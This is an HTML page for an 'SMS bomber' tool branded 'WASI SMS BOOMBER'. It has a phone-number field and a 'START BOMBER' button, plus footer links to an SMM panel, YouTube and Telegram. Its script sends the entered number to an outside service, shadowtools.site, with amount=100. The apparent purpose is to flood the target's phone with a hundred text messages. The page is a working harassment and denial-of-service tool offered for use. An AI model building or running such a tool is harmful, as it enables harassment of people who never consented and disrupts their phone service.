<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WASI SMS BOOMBER</title>
  <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Luckiest Guy', cursive;
      background: #111;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
    }

    .corner-image {
      position: absolute;
      top: 15px;
      left: 15px;
      width: 80px;
      height: 80px;
      border-radius: 50%;
      border: 3px solid white;
      object-fit: cover;
    }

    h1 {
      font-size: 2.5rem;
      margin-top: 100px;
    }

    input {
      padding: 12px;
      font-size: 18px;
      margin: 20px 0;
      border-radius: 10px;
      border: none;
      width: 250px;
      text-align: center;
    }

    button {
      margin: 10px;
      padding: 14px 28px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      background-color: #ff007f;
      color: white;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background-color: #e60073;
    }

    .footer-buttons {
      margin-top: 40px;
    }
  </style>
</head>
<body>

  <!-- Circular image in the corner -->
  <img src="https://i.postimg.cc/BnckgRqN/IMG-20240927-WA0235.jpg" alt="Profile" class="corner-image">
  <!-- Replace above link with your image -->

  <h1>WASI SMS BOOMBER</h1>

  <input type="text" id="phoneNumber" placeholder="Enter phone number">
  <br>
  <button onclick="startBomber()">START BOMBER</button>

  <div class="footer-buttons">
    <button onclick="window.open('https://wasismmpannel.online', '_blank')">SMM PANEL</button>
    <button onclick="window.open('https://youtube.com/@awaishaidermunara', '_blank')">YouTube Channel</button>
    <button onclick="window.open('https://t.me/aloneboywasi', '_blank')">Telegram</button>
  </div>

  <script>
    function startBomber() {
      const number = document.getElementById('phoneNumber').value;
      if (number === "") {
        alert("Please enter a phone number!");
        return;
      }

      fetch(`https://shadowtools.site/smsbomberapi/smsbomber.php?number=${number}&amount=100`)
        .then(res => res.text())
        .then(data => alert("API Triggered!\n" + data))
        .catch(err => alert("Error: " + err));
    }
  </script>

</body>
</html>
